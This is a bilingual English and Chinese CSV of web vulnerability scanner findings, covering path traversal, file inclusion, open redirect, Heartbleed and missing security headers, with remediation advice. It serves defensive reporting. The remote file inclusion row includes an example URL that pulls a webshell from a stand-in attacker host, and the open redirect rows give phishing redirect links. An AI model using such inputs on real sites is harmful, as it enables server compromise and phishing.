id,type,origin,enabled,risk,cost,name_en,name_zh,desc_en,desc_zh,advice_en,advice_zh
0,A1,Directory Browsing,TRUE,,,,,,,,
2,A1,Private IP Disclosure,TRUE,,,,,,,,
3,A1,Session ID in URL Rewrite,TRUE,,,,,,,,
6,A1,Path Traversal,TRUE,High,Medium,Directory Traversal,路徑遍尋,"We detected that your website is vulnerable to dirctory traversal.
 A directory traversal attack allows an attacker access to arbritrary restricted files directories and sensitive commands by manipulating a url. Any device that exposes an http-based interface is potentially vulnerable to path traversal. This vulnerability allows attackers to read sensitive information within the websites restricted files, and may lead to data exposure, credential leakage, and accont compromise. Attackers may utilize special-characters sequences, for example the ../ special-character sequence, to alter the resource location requested in the url. Advanced information： Although most popular web servers will prevent this technique with security filters, attackers may bypass them using alternate encodings, including unicode-encoded slash characters, url encoded characters, and double url encodings. Even if the web server properly restricts path traversal attempts in the url path, a web application may still be vulnerable due to improper handling of user-supplied input, such as substituting the original url parameter value with the file name of one of the web application's dynamic scripts. Consequently the results can reveal source code because the file is interpreted as text instead of an executable script. These techniques often employ additional special characters such as the dot (.) to reveal the listing of the current working directory or %00 null characters in order to bypass rudimentary file extension checks.","檢測到您的網站有被路徑遍尋攻擊的可能。
​此攻擊會導致攻擊者訪問未開放的隱私路徑，使網站邏輯或是隱私洩露，常見於洩漏index目錄中的logs文件內容導致揭露使用者資訊及系統資訊，進而產生一系列如帳號列舉等攻擊。​ 路徑遍尋攻擊是使攻擊者可以訪問位於Web根目錄之外的文件目錄和命令，能以特定方式操縱URL，使網站可以執行或顯示Web服務器上任何位置的任意文件的內容，最基本的路徑遍歷攻擊是使用 ../ 特殊字符序列來更改url中請求的資源位置。","• When evaluating request parameters, use a whitelist of acceptable inputs and reject any input that does not strictly conform to specifications. Use blacklists to detect potential attacks or reject malformed inputs. Do not rely exclusively on blacklist.
•During input validation, consider all relevant properties including length, type of input, syntax consistency, and conformance to business rules.
• For filenames, limit the allowed character set and file extensions, and exclude directory separators such as /. 
• Make sure that your application does not decode the same input twice. 
• Run your code using the lowest privileges that are required, and in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This ensures that high privileged actions are prohibited even when an attacker has compromised an account.""","• 使用嚴格符合規範的白名單，拒絕任何不符合規範的輸入。 ​
• 在執行輸入驗證時，請考慮所有可能相關的屬性，包括輸入的長度、類型等。​
• 對於文件名，限制允許的字符集和文件擴展名，並排除目錄分隔符，例如 /。
• 確保您的應用程序不會對相同的輸入進行兩次解碼。
• 如果可能，請創建僅用於單個任務的具有有限的特權的隔離帳戶，即使攻擊者成功獲取該權限，也無法立即訪問網頁的其餘需較高權限部分或其環境。"""
7,A3,Remote File Inclusion,TRUE,High,,Remote File Inclusion,文件引用（遠端文件）,"Remote File Include (RFI) is an attack technique used to exploit “dynamic file include” mechanisms in web applications. When web applications take user input (URL, parameter value, etc.) and pass them into file include
 commands, the web application might be tricked into including remote files with malicious code. Almost all web application frameworks support file inclusion. File inclusion is mainly used for packaging common code into separate files that are later referenced by main application modules. When a web application references an include file, the code in this file may be executed implicitly or explicitly by calling specific procedures. If the choice of module to load is based on elements from the HTTP request, the web application might be vulnerable to RFI. An attacker can use RFI for： * Running malicious code on the server： any code in the included malicious files will be run by the server. If the file include is not executed using some wrapper, code in include files is executed in the context of the server user. This could lead to a complete system compromise. * Running malicious code on clients： the attacker's malicious code can manipulate the content of the response sent to the client. The attacker can embed malicious code in the response that will be run by the client (for example, JavaScript to steal the client session cookies). PHP is particularly vulnerable to RFI attacks due to the extensive use of “file includes” in PHP programming and due to default server configurations that increase susceptibility to an RFI attack.",檢測到您的網站有引用遠程文件的風險，可能使您的網站中意外帶入有風險的文件，常見為網站遠程引用含有竊取用戶cookie的惡意程式文件。 遠程文件引用是網頁為了讓自身可以插入不在本地伺服器的文件而設定的功能，但因為設置及防護不足而導致使駭客有可乘之機。 攻擊範例可能如下：駭客將以下指令包含進網頁之中https：//example.com/index.php?page=https：//evil.com/uploads/webshell.txt 使雖然前面是正常引用的正常文件，卻被連結到惡意網站中。,"• Make sure that remote file references are disabled in the configuration, and if the Allow_url_include can be set to '0' in PHP. In addition, it is recommended that all inputs such as URLs need to be validated before passing the data","• 確保程式語言的配置中禁用遠程文件引用，且若是在
PHP中可以allow_url_include設置為'0'。 此外，建議所有的輸入，例如：URL 需進行驗證，才將資料進行傳遞。"""
41,A5,Source Code Disclosure - Git ,TRUE,,,,,,,,
42,A5,Source Code Disclosure - SVN,TRUE,Medium,Low,Source SVN Leakage,SVN原始碼揭露,The source code for the current page was disclosed by the web server .,"檢測到您的網站可能有SVN原始碼洩露的風險。 
此風險會導致駭客獲取Server的原始碼甚至SVN Server上的帳號密碼。 通常風險的發生原因是因為在網站部署時未將程式碼匯出，導致不小心直接將所有SVN部署資訊及敏感資料送至外部。 ",• Ensure that SVN metadata files are not deployed to the web server or application server,"• 確認網站上無.svn/entries的檔案以及設定不允許使用者嘗試在URL輸入此字尾 。
• 設定完成後以報告中路徑測試，再次確認使用者無法存取檔案。"
43,A5,Source Code Disclosure - File Inclusion,TRUE,High,High,Source File Leakage,原始碼揭露,"We detected that your website leaks source code using local file inclusion. Source code often contains some form of sensitive information, such as configuration-related information (e.g. database credentials), username, passwords, or the internal workings and business logic of the web application. If source code files are disclosed, an attacker may use such information to discover logical flaws or obtain account information from databases or administrative panels. This may escalate to a chain of attacks, including SQL Injection, database takeovers, and remote code execution which would lead to data leakage, malware infections, or service denial.","檢測到您的網站可能有原始碼揭露的問題。​
如果公開原始碼文件，攻擊者可能使用此類的信息來發現邏輯缺陷，​例如密碼邏輯或是正規式漏洞導致攻擊者可以依據文件中漏洞縮小密碼列舉範圍、執行SQL注入、資料庫接管或遠程代碼執行等一系列攻擊。​ 原始碼通常包含某些形式的敏感信息，例如與配置相關的信息（例如資料庫憑證），或是Web應用程序工作方式的信息。","• Confirm exactly what aspects of the source code are actually disclosed and determine if it is necessary 
• If a file is required by the application, change its permissions to prevent public users from accessing it. Otherwise, remove it from the web server. 
• Remove all temporary and backup files from the web server.""","• 確認揭露的原始碼是否需要公開。​ 
• 如果應用程序需要這些文件，請更改權限禁止公開存取該文件，否則，請從Web伺服器中將其刪除。​ 
• 從Web伺服器上刪除所有臨時和備份文件。"
10003,A6,Vulnerable JS Library,TRUE,High,High,Vulnerable JS Library,有漏洞的JS函式庫,,"檢測到您的網站使用有已知漏洞的 JS 函式庫版本。
駭客可以利用此版本的弱點對您的服務進行攻擊。",,"• 請使用最新版本函式庫(jQuery 3.5.0以上版本)。
程式或框架中，若有使用到第三方資源，則需特別注意引用的版本是否安全，定期更新使用最新版本或無漏洞之穩定版本。"
10010,A5,Cookie No HttpOnly Flag,TRUE,Low,Low,Misconfigured Cookie： Missing HttpOnly Attribute,標頭配置錯誤（缺少 HttpOnly 屬性）,"A cookie has been set without the HttpOnly flag, which means that the cookie can be accessed by JavaScript. If a malicious script can be run on this page then the cookie will be accessible and can be transmitted to another site. If this is a session cookie then session hijacking may be possible.",檢測到您的網站在標頭中缺少HttpOnly屬性，該屬性可用來會限制cookie只能經由 HTTP(S)協定來存取。因此當網站有XSS弱點時，若cookie含有HttpOnly flag，則攻擊者無法直接經由JavaScript存取使用者的session cookie，可降低使用者身份被盜用的機率。 針對跨網站偽造要求的攻擊(cross-site request forgery attacks)作保護。,Ensure that the HttpOnly flag is set for all cookies.,• 以Java設置HttpOnly為例，可以在WEB-INF/web.xml進行設定 <session-config> <cookie-config> <http-only>true</http-only> </cookie-config> </session-config> 即可設置HttpOnly於session cookie。
10011,A5,Cookie Without Secure Flag,TRUE,Low,Low,Misconfigured Cookie： Missing Secure Attribute,標頭配置錯誤（缺少 Secure 屬性）,"A cookie has been set without the secure flag, which means that the cookie can be accessed via unencrypted connections.","檢測到您的網站在標頭中缺少Secure 屬性，該屬性用以
限制Cookie 傳輸的方式。 如果Secure Attribute 設置為True 時，Cookie只能以""""安全""""的形式向伺服器傳輸，例如是HTTPS 的方式，並在過程中進行加密使Cookie 的內容不容易被竊取。","Whenever a cookie contains sensitive information or is a session token, then it should always be passed using an encrypted channel. Ensure that the secure flag is set for cookies containing such sensitive information.",• 以java為例可以在Cookie Interface設置 cookie.setSecure(true); 或是web.xml中設置 <session-config> <cookie-config> <secure>true</secure> </cookie-config> </session-config>。
10015,A4,Incomplete or No Cache-control Header Set,TRUE,Low,Low,Misconfigured Headers： Missing Cache-control and Pragma,標頭配置錯誤（缺少 Cache-control and Pragma）,The cache-control and pragma HTTP header have not been set properly or are missing allowing the browser and proxies to cache content.,檢測到您的網站在標頭中缺少Cache-control及Pragma，該屬性可用來限制網頁快取不被共用的快取伺服器存取及設定快取有效期限，使快取資源有有效期限，不易被駭客利用。,"Whenever possible ensure the cache-control HTTP header is set with no-cache, no-store, must-revalidate; and that the pragma HTTP header is set with no-cache.","• 可設定不要存任何快取Cache-Control：no-store或是快取需存取，但是要重新驗證Cache-Control：no-cache 設定快取不能被共用的快取伺服器儲存Cache-Control：private設定快取有效期限Cache-Control：max-age=3600驗證快取伺服器先發送請求訊息給網頁伺服器驗證，確認是有效期限且檔案有更新的回覆，舊的檔案就不能使用。"""
10017,A8,Cross-Domain JavaScript Source File Inclusion,TRUE,Low,High,Cross-Domain File Inclusion： Javascript,跨域引用檔案（Javascript）,The page includes one or more script files from a third-party domain.,檢測到您的網站包含其他人的程式碼，可能含有風險的程式碼或導致用戶遭竊取敏感信息/資源。 會使您無法控制該程式碼中的內容，也無法控制託管該程式碼的伺服器安全性。 當您的某些JavaScript文件位於不受您管理的第三方域上時，攻擊者可能會嘗試劫持該域或訪問該第三方伺服器導致文件被惡意內容替換。,"Ensure JavaScript source files are loaded from only trusted sources, and the sources can't be controlled by end users of the application.",• 確保只從受信任的來源及域載入JavaScript文件 將所有應用程序文件託管在伺服器或直得信任的第三方服務（例如CDN）。
10019,A8,Content-Type Header Missing,TRUE,,,,,,,,
10020,A4,X-Frame-Options Header,TRUE,Low,Low,Misconfigured Headers：X-Frame-Options,標頭配置錯誤（X-Frame-Options）,"We detected that your website is missing the X-Frame-Options 
header and is vulnerable to clickjacking attacks. Clickjacking is an attack that tricks a user into clicking a webpage element which is invisible or disguised as another element. Typically, clickjacking is performed by displaying an invisible page or HTML element, inside an iframe, on top of the page the user sees. The user believes they are clicking the visible page but in fact they are clicking an invisible element in the additional page transposed on top of it. This can cause users to unwittingly download malware, visit malicious web pages, provide credentials or sensitive information, transfer money, or purchase products online. The X-Frame-Options HTTP header field indicates whether the browser should render the transmitted resource within <frame>, <iframe>, <embed>, or <object>. Servers can declare this policy in the header of their HTTP responses to prevent clickjacking attacks, which ensures that their content is not embedded into other pages or frames. ","檢測到您的網站缺少或未正確設定X-Frame-Options標頭，這表示網站有遭受點擊劫持攻擊的風險。
點擊劫持是一種攻擊者在惡意網站上通過iframe載入目標網頁，然後隱藏目標網頁，欺騙用戶點擊隱藏的惡意連結，使用戶認為他們點擊的是目前所見頁面，但實際上，他們點擊的是附加所見頁面上的不可見元素。","• 'X-Frame-Options： DENY' completely denies to be loaded in frame/iframe. In /etc/apache2/conf-enabled/security.conf (debian) or /etc/httpd/conf/httpd.conf (redhat), add the entry： Header set X-Frame-Options： DENY 
• 'X-Frame-Options： SAMEORIGIN' allows only if the site which wants to load has a same origin. In /etc/apache2/conf-enabled/security.conf (debian) or /etc/httpd/conf/httpd.conf (redhat), add the entry： Header set X-Frame-Options： SAMEORIGIN 
","• 如果您的網站不須使用X-Frame，請將X-Frame-Options設定為DENY，以預防攻擊者利用X-Frame攻擊。
以常見的網站伺服器Apache為例，請在security.conf中新增一行設定「Header set X-Frame-Options: ""DENY""」，其他網站伺服器請參考相關安全性設定。
• 如果您的網站會用到來自內部的X-Frame，請將X-Frame-Options設定為SAMEORIGIN，以防止從外部嵌入的X-Frame。以常見的網站伺服器Apache為例，請在security.conf中新增一行設定「Header set X-Frame-Options: ""SAMEORIGIN""」，其他網站伺服器請參考相關安全性設定。"
10021,A5,X-Content-Type-Options Header Missing,TRUE,Low,Low,Misconfigured Headers： Missing X-Content-Type-Options,標頭配置錯誤（缺少X-Content-Type-Options）,"The Anti-MIME-Sniffing header X-Content-Type-Options was not set to nosniff. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, 
potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.",檢測到您的網站在標頭中缺少 X-Content-Type-Options設定，該設定可避免瀏覽器誤判文件形態，防止Content-Type被竄改，降低跨站點腳本（XSS）攻擊的風險。,"Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages. If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.",• 在您的WebServer設定一個帶有'nosniff'值的'X-Content-Type-Options'標頭。
10023,A1,Information Disclosure - Debug Error Messages,TRUE,Low,Low,Debug Message Leakage,偵錯信息揭露,"We detected that your website leaks debug messages with detailed descriptions. This vulnerability may disclose sensitive information like the location of the file that produced the unhandled exception and the internal logic of the source code. Attackers may use this information to fingerprint and launch further attacks against the web application, such as substituting existing files to execute malicious code or identifying additional vulnerable targets.",檢測到您的網站頁面包含一條偵錯信息，該信息可能會洩露敏感資訊，造成安全風險。 例如發現紀錄異常的文件位置，內容包含網頁結構及資料夾名稱，導致攻擊者可藉此針對網頁進行資料探尋、替換等攻擊行為。 偵錯信息可用於對網頁應用程序發起進一步的攻擊， 例如利用洩漏的程式邏輯尋找程式漏洞或是辨識其他可能利用的攻擊目標。,"• Review the source code of this page and remove any debug messages or unprotected debugging functionality. 
•Only allow debug message logging on the server side and do not expose them to the user.","• 查看此頁面的原始碼，並移除任何可能顯示給用戶的偵錯信息。確認偵錯用的指令或是api有驗證保護。 
• 確認偵錯信息的紀錄留存只在伺服器端。"
10024,A1,Information Disclosure - Sensitive Information in URL,TRUE,,,,,,,,
10025,A1,Information Disclosure - Sensitive Information in HTTP Referrer Header,TRUE,,,,,,,,
10026,A3,HTTP Parameter Override,TRUE,,,,,,,,
10027,A1,Information Disclosure - Suspicious Comments,TRUE,,,,,,,,
10028,A1,Open Redirect,TRUE,High,Medium,Open Redirect,不安全的重新導向,Open redirects are one of the OWASP 2010 Top Ten vulnerabilities. This check looks at user-supplied input in query string parameters and POST data to identify where open redirects might be possible. Open redirects occur when an application allows user-supplied input (e.g. http：//nottrusted.com) to control an offsite redirect. This is generally a pretty accurate way to find where 301 or 302 redirects could be exploited by spammers or phishing attacks. For example an attacker could supply a user with the following link： http：//example.com/example.php?url=http：//malicious.example.com.,檢測到您的網站有不安全的重導向風險，原因是您的網站開放在URL重新導向的功能，這會使用戶訪問可信任的網站URL時，將用戶重新導向到惡意網站，屬於釣魚手段的一種。 舉例來說：http://true.com/etrue.php?url=http://evil.com 最後會被導向到evil中。,"To avoid the open redirect vulnerability, parameters of the application  script/program must be validated before sending 302 HTTP code (redirect) to the client browser. Implement safe redirect functionality that only redirects to relative URI's, or a list of trusted domains","• 停用轉址功能 。
• 排除特殊字元符號，像是「<」、「/」、「>」等避免注入攻擊 。
• 建立轉址白名單，只有在白名單上的網路位址才能進行導向。"
10029,A3,Cookie Poisoning,TRUE,,,,,,,,
10030,A3,User Controllable Charset,TRUE,,,,,,,,
10031,A3,User Controllable HTML Element Attribute (Potential XSS),TRUE,,,,,,,,
10032,A4,Viewstate,FALSE,,,Viewstate,ViewState中含敏感資料,"We detected that your website leaks sensitive information in the ViewState context. Sensitive information include non-public emails, or IPs of other internal services. The ViewState is a mechanism built in to the ASP.NET platform for persisting elements of the user interface and other data across successive requests. The data to be persisted is serialized by the server and transmitted via a hidden form field. When it is posted back to the server, the ViewState parameter is deserialized and the data is retrieved.",檢測到您的網站在ViewState上下文中有敏感資訊洩漏。 常見的敏感資訊洩漏包含非公開電子郵件，或是內部其他 服務的IP，ViewState是ASP.NET平台中內置的一種機制，用於在連續請求中持久保留用戶界面元素和其他數據。 服務器將要保留的數據序列化，並通過隱藏的表單字段進行傳輸。 將其發布回伺服器後，將對ViewState參數進行反序列化並檢索數據。,"• Please verify if the provided emails are confidential. 
• Remove or hide all detected emails as appropriate.
• Please verify if the provided IPs are confidential. 
• Remove or hide all detected IPs as appropriate.","• 請驗證所檢測的電子郵件是否為機密信息。 
• 移除或隱藏所有網頁上檢測到的非公開的電子郵件。
• 請驗證所檢測的IP位置是否為機密信息。 
• 移除或隱藏所有網頁上檢測到的非公開的IP位置。"
10033,A1,Directory Browsing,TRUE,Medium,Medium,Directory Browsing,目錄瀏覽,"We detected that your server has enabled directory browsing.
This allows anyone who visits your service to navigate through the folders of your server and expose sensitive information. It also allows hackers to fingerprintf your services and broaden the attack surface. By default, the Apache2 server comes with directory browsing enabled.",檢測到您的網站啟用目錄瀏覽，此功能可能會導致有安全疑慮的產生。此風險會使任何訪問您服務的人都可以瀏覽服務器的資料夾，並公開敏感信息。 默認情況下，Apache2服務器帶有啟用目錄瀏覽的功能，常因而導致此風險產生。,"• Find the location of Apache's main configuration file 'apache2.conf', usually under '/etc/apache2/apache2.conf'. 
• Edit this file with root access to your server, and modify this line by adding a preceding '-' sign to the word 'Indexes'： 'Options Indexes FollowSymLinks' change to 'Options -Indexes FollowSymLinks' • Save the file and restart Apache Alternatively, edit the '.htaccess' and modify the Options line as 'Options -Indexes","• 查找Apache主要配置文件"" apache2.conf”的位置，通常在“ /etc/apache2/apache2.conf”下。 
• 使用對服務器的root訪問權限來編輯此文件，並通過在單詞“索引”中添加前面的“-”符號來修改此行： '選項索引FollowSymLinks'更改為'選項-索引FollowSymLinks' 。
• 保存文件並重新啟動Apache 或者，編輯“ .htaccess”並將“選項”行修改為“選項-索引””"
10034,A4,Heartbleed OpenSSL Vulnerability (Indicative),TRUE,High,Medium,HeartBleed (CVE-2014-0160),HeartBleed (CVE-2014-0160),"We detected that this website uses HeartBeat Extension packets, which is vulnerable to the HeartBleed OpenSSl attack.
This allows remote attackers to disclose sensitive information, including SSL encryptions keys, authentication tokens, and even system credentials, from process memory via crafted packets.
This vulnerability exists because the TLS and DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, which as a result may trigger a buffer overread.","檢測到您的網站有Heartbeat Extension數據包。
HeartBleed可能導致觸發緩衝區溢位的安全問題。 攻擊者可透過此弱點傳送緩衝區溢位資訊去觸發Heartbeat Extension數據包，導致客戶端與伺服器之間記憶體資料出錯而洩漏機敏資料，包含用來加密 SSL 密鑰與認證用的 Token。 在OpenSSL 1.0.1g之前的版本 ，TLS和DTLS無法準確的處理Heartbeat Extension數據包，這使遠端攻擊者可以通過觸發緩衝區溢位從程序的內部儲存中獲取敏感信息。","• If possible, update to OpenSSL 1.0.1g or later. 
• Otherwise, get a patch from your vendor. Most Linux distribution vendors have been publishing updated packages (Fedora, RedHat, CentOS, Debian, etc). 
• Turn off TLS HeartBeats if you have access to the source code. 
• Change asymmetric private keys and shared secret keys, since these may have been compromised. 
• Re-issue HTTPS certificates 
• Invalidate session keys and cookies 
• Reset passwords and shared secrets 
• Revoke old certificates 
• Update your IPS and firewall signatures and enable Heartbleed signatures. Contact your vendor if necessary.","• 在允許的情況下更新到OpenSSL 1.0.1g或更高版本。 
• 從供應商處獲取補丁（大多數Linux發行商已經發布了更新的軟件包Fedora，RedHat，CentOS，Debian等）。  
•如果您有權變更原始碼，請關閉TLS HeartBeats。 
• 變更非對稱私鑰和共享密鑰、重新分發HTTPS憑證、取消舊憑證、因為它們可能已被洩漏或竄改。 
• 更新您的IPS和防火牆簽名，並啟用Heartbleed簽名。 如有必要，請與您的供應商聯繫。"""
10035,A2,Strict-Transport-Security Header,TRUE,,,Misconfigured Headers： Missing Strict-Transport-Security,標頭配置錯誤（缺少 Strict-Transport-Security）,"HTTP Strict Transport Security (HSTS) is a web security policy
 mechanism whereby a web server declares that complying user agents (such as a web browser) are to interact with it using only secure HTTPS connections (i.e. HTTP layered over TLS/SSL). HSTS is an IETF standards track protocol and is specified in RFC 6797.",檢測到您的網站在標頭中缺少Strict-Transport-Security設定，此設定是一種可選擇的安全性強化功能，由Web應用程序通過使用標頭指定。 一旦受瀏覽器收到此標頭，瀏覽器將只能通過HTTPS發送資訊，阻止HTTP發送任何資訊。,"•Ensure that your web server, application server, load balancer, 
etc. is configured to enforce Strict-Transport-Security.",• 在您的WebServer設定一個Strict-Transport-Security： max-age=31536000; includeSubDomains的標頭 ＊此設定會導致只能通過HTTP進行服務的頁面的訪問失敗。
10036,A1,HTTP Server Response Header,TRUE,,,,,,,,
10037,A1,"Server Leaks Information via ""X-Powered-By"" HTTP Response Header Field(s)",TRUE,Low,Low,Header Leakage： X-Powered-By,標頭資訊洩露（X-Powered-By）,"We discovered that your website leaks technology information in the 'Server' header. This vulnerability may disclose the employed programming languages and frameworks of the backend server, allowing the attacker to fingerprint the site's technologies and pinpoint potential vulnerabilities in outdated software. An attacker may leverage this knowledge to attack your website when a new vulerability is released in the future.",檢測到您的網站在標頭中洩漏 X-Powered-By 信息，該信息可能會洩露後端伺服器資訊以及所使用的程式語言或框架，造成安全風險。攻擊者可比照各種軟韌體版本資訊找出過期或未修補的系統，進而滲透利用。即使當前版本安全，未來若此版本有新漏洞釋出，您的網站可能因洩漏此資訊而在短時間內遭到攻擊。,"•Remove the X-Powered-By HTTP header. To configure this on Apache： Add these lines in httpd.conf： <IfModule mod_headers.c> Header unset X-Powered-By </IfModule> To configure this on nginx： Add this line in nginx.conf： proxy_hide_header X-Powered-By; Additionally, you must also modify the configuration for used languages(ex： PHP) and framework(ex： Tomcat) to remove the X-Powered-By header. To configure this on IIS： Change the system.webSerer section in Web.config as below： <system.webServer>","• 在IIS伺服器中的Web.config修改system.webServer區段：
<httpProtocol><customHeaders><remove name=""X-Powered-By"" /></customHeaders></httpProtocol></system.webServer>"
10038,A5,Content Security Policy (CSP) Header Not Set,TRUE,Medium,Low,Misconfigured Headers： Missing CSP,標頭配置錯誤（缺少CSP）,"Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.","檢測到您的網站在標頭中缺少內容安全策略（CSP）。
內容安全策略（CSP）是附加性的安全措施，有助於檢測和緩解某些類型的攻擊，包括跨域腳本攻擊（XSS）和數據注入攻擊。 CSP提供了一組標準HTTP標頭，允許網站所有者聲明允許瀏覽器在該頁面上加載的已批准內容來源-涵蓋的類型包括JavaScript，CSS，HTML框架，字體，圖像和可嵌入對象，例如Java applet，ActiveX，音頻和視頻文件。","•Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header, to achieve optimal browser support： 'Content-Security-Policy' for Chrome 25+, Firefox 23+ and Safari 7+, 'X-Content-Security-Policy' for Firefox 4.0+ and Internet Explorer 10+, and 'X-WebKit-CSP' for Chrome 14+ and Safari 6+","• 限制外部連入的檔案和禁用inline語法，這是預設全部阻擋的寫法，也是最嚴格最安全的方案，設定範例如下
content-security-policy: default-src 'none';
• 增加外部連入的白名單，限制外部連入的來源，請避免在來源url中使用「*」，設定範例如下
content-security-policy: default-src 'none'; 
script-src 'self' https://www.google.com;
• 避免在CSP設定中使用「unsafe-inline」"
10039,A1,X-Backend-Server Header Information Leak,TRUE,Low,Low,Misconfigured Headers： X-Backend-Server,標頭配置錯誤（X-Backend-Server）,The server is leaking information pertaining to backend systems (such as hostnames or IP addresses). Armed with this information an attacker may be able to attack other systems or more directly/efficiently attack those systems.,檢測到您的網站中標頭有後端Server版本資料揭露的風險。因為Server配置標頭設定時，未特別針對後端Server的訊息做隱藏，這可能會導致後端Server的主機名稱和IP位置揭露，使攻擊者可以更針對性的設計攻擊。,"Ensure that your web server, application server, load balancer, etc. is configured to suppress X-Backend-Server headers.", 確認報告中後端Server的洩漏訊息，確保無主機名稱和IP位置揭露。
10040,A4,Secure Pages Include Mixed Content,TRUE,Low,Medium,Mixed HTTP and HTTPS content,混合 HTTP HTTPS 內容,"We detected that your website contains mixed HTTP and HTTPS content. As a result, an attacker can intercept and rewrite content, thereby taking full control of your page or even your entire website. This allows the attacker to modify the page, including displaying entirely different content, stealing user passwords or other login credentials, stealing user session cookies, or redirecting the user to a different site entirely. Mixed content occurs when the initial HTML is loaded over a secure HTTPS connection, but other resources (such as images, videos, stylesheets, scripts) are loaded over an insecure HTTP connection. This is called mixed content because both HTTP and HTTPS content are being loaded to display the same page, and the initial request was secure over HTTPS.",檢測到您的網站有HTTP與HTTPS混合內容的風險。例如攻擊者可以攔截和重寫內容，從而完全控制您的頁面甚至整個網站。 甚至攻擊者可以修改頁面，包括顯示完全不同的內容，竊取用戶密碼或登錄憑證，竊取用戶Session Cookie或將用戶完全重導向到其他站點。 由於這種威脅的嚴重性，默認情況下，大多數瀏覽器已經阻止了此類內容以保護用戶。 當以安全的HTTPS載入初始HTML，但通過不安全的HTTP加載其他資源（例如圖像，視頻，樣式表，腳本）時，就會發生混合內容，但因為初始請求通過HTTPS是安全的，導致該內容可以通過審查。,"• The best strategy to avoid mixed content blocking is to serve all the content as HTTPS instead of HTTP. A page that is available over SSL/TLS must be comprised completely of content which is transmitted over SSL/TLS. 
• For your own domain, serve all content as HTTPS and fix your links. 
• HTTP Strict Transport Security (HSTS) is a mechanism that enforces secure resource retrieval, even in the face of user mistakes (attempting to access your web site on port 80) and implementation errors (your developers place an insecure link into a secure page). 
• Content Security Policy (CSP) can be used to block insecure resource retrieval from third-party web sites. 
• Use 'protocol relative URLs' to have the user's browser automatically choose HTTP or HTTPS as appropriate, such as '<script type=""""text/javascript"""" src=""""//example.com/code.js""""></script>'","• 避免混合內容導致的安全疑慮，最佳的策略是將所有內容作為HTTPS而不是HTTP。 
• 通過SSL / TLS可用的頁面必須完全包含通過SSL / TLS傳輸的內容。
• 對於您自己的域，將所有內容用作HTTPS並修復連接。
• HTTP嚴格傳輸安全性（HSTS）是一種強制執行安全資源檢索的機制，可以防止用戶錯誤（試圖通過端口80訪問您的網站）和實現錯誤（您的開發人員將不安全的連接放置到安全頁面中）產生的安全風險。 
• 內容安全策略（CSP）可用於阻止從第三方網站檢索不安全的資源 。
• 使用“protocol relative URLs”使用戶的瀏覽器根據需要自動選擇HTTP或HTTPS，例如 '<script type=""""""""text/javascript"""""""" src=""""""""//example.com/code.js""""""""></script>'。"""
10041,A2,HTTP to HTTPS Insecure Transition in Form Post,TRUE,Medium,Low,HTTPS form in insecure HTTP page,不安全的表單提交（HTTP含HTTPS）,"We detected that your website serves HTTPS forms from an insecure HTTP page. This page could be hijacked using a Man-in-the-middle attack in which an attacker can replace or spoof the form target. If this page contains sensitive information, the attack may result in credential theft, data leakage, victim impersonation, and phishing attempts.",檢測到您網站中此HTTPS表單是從不安全的HTTP頁面提供的，可能會產生安全疑慮。 例如當訂購表單中的資料含機敏資訊時會導致機敏資訊的洩漏，此外也可能導致攻擊者竄改此表單的內容將送件地址改為攻擊者接收。 此風險是因為攻擊者基於HTTP頁面未加密內容的風險而使用中間人攻擊來劫持此頁面，替換或欺騙表單的目標。,"• The form should be served from a secure HTTPS page. 
• Configure the site to use HTTPS and ensure all assets are loaded over HTTPS.","• 表單內容都應從安全的HTTPS頁面提供。 
• 配置站點使用HTTPS，並確保所有資源都是通過HTTPS加密傳輸。"
10042,A2,HTTPS to HTTP Insecure Transition in Form Post,TRUE,Medium,Medium,Insecure HTTP form in HTTPS page,不安全的表單提交（HTTPS含HTTP）,"We detected that your website serves insecure HTTP forms from a HTTPS page, meaning that a secure page is transitioning to an insecure page when data is uploaded through a form. This page could be hijacked using a Man-in-the-middle attack in which an attacker can replace or spoof the form target. If this page contains sensitive information, the attack may result in credential theft, data leakage, victim impersonation, and phishing attempts. The user may think they're submitting data to a secure page when in fact their data is not encrypted.",檢測到您網站中此HTTPS頁面中有不安全的HTTP表單的，這可能會產生安全風險。 例如當訂購表單中的資料含機敏資訊時會導致機敏資訊的洩漏，此外也可能導致攻擊者竄改此表單的內容將送件地址改為攻擊者接收。 此風險是因為攻擊者基於HTTP表單未加密內容的風險而使用中間人攻擊來劫持此頁面，替換或欺騙表單的目標。 因HTTPS頁面中包含不安全的HTTP表單，這表示客戶通過表單上傳數據時，用戶可能認為他們正在向安全頁面提交數據，而實際上他們的數據未加密 ,"• The form target should point to a secure HTTPS page. 
• Configure HTTPS for all HTTP POST request within the web application to ensure communication of data over encrypted channel for security.","• 表單目標應指向安全的HTTPS頁面。 
• 為Web應用程序中的所有HTTP POST請求配置HTTPS，以確保所有資源都是通過HTTPS加密傳輸。"
10043,A3,User Controllable JavaScript Event (XSS),TRUE,,,,,,,,
10044,A1,Big Redirect Detected (Potential Sensitive Information Leak),TRUE,Low,Low,Redirect Response with Large Body Content,重導向回覆包含大量資訊,"The server has responded with a redirect that seems to provide a large response. This may indicate that although the server sent a redirect it also responded with body content (which may include sensitive details, PII, etc.).",檢測到您的網站執行導頁時有過多網頁回應，可能讓您的網站在過程中洩漏較敏感資訊或是個人資訊，這些信息可能會導致進一步針對內部系統的攻擊（例如列舉帳號或是釣魚社交工程）。,•Ensure that no sensitive information is leaked via redirect responses. Redirect responses should have almost no content.,• 依據報告檢查並刪除網頁回應中較敏感資訊，如系統資訊或是個人敏感資訊。
10045,A5,Source Code Disclosure - /WEB-INF folder,TRUE,,,,,,,,
10047,A4,HTTPS Content Available via HTTP,TRUE,Low,Low,HTTPS Content Available via HTTP,,,,,
